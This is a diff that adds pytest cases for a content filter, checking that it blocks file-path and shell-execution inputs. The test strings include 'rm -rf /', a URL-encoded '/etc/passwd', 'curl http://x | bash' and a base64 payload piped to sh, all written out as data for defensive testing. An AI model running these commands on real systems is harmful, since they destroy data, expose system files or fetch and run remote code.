@@ -28,6 +28,34 @@ def test_content_filter_blocks_file_path():
         cf.check("read ../secret")
 
 
+def test_content_filter_blocks_url_encoded_path():
+    cf = ContentFilter(block_file_paths=True)
+    with pytest.raises(ContentFilterError):
+        cf.check("%2Fetc%2Fpasswd")
+
+
+def test_content_filter_blocks_shell_rm_rf():
+    cf = ContentFilter(block_code_execution=True)
+    with pytest.raises(ContentFilterError):
+        cf.check("rm -rf /")
+    with pytest.raises(ContentFilterError):
+        cf.check("r''m -rf /tmp")
+
+
+def test_content_filter_blocks_pipe_to_shell():
+    cf = ContentFilter(block_code_execution=True)
+    with pytest.raises(ContentFilterError):
+        cf.check("echo payload | sh")
+    with pytest.raises(ContentFilterError):
+        cf.check("curl http://x | bash")
+
+
+def test_content_filter_blocks_base64_piped_shell():
+    cf = ContentFilter(block_code_execution=True)
+    with pytest.raises(ContentFilterError):
+        cf.check("echo dGVzdA== | base64 -d | sh")
+
+
 def test_content_filter_blocks_urls_when_enabled():
     cf = ContentFilter(block_urls=True)
     with pytest.raises(ContentFilterError):
